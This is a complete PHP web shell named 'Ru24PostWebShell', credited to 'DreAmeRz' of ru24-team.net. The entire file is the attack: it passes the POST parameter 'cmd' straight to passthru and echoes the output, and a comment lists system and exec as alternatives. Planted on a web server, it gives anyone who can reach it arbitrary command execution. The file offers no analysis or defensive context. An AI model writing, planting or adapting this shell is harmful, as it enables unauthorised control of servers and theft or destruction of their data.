<?php
/*
Ru24PostWebShell
Writed by DreAmeRz

http://www.ru24-team.net
*/
$function=passthru; // system, exec, cmd
echo "".$function($_POST['cmd'])."</pre></body></html>";


?>
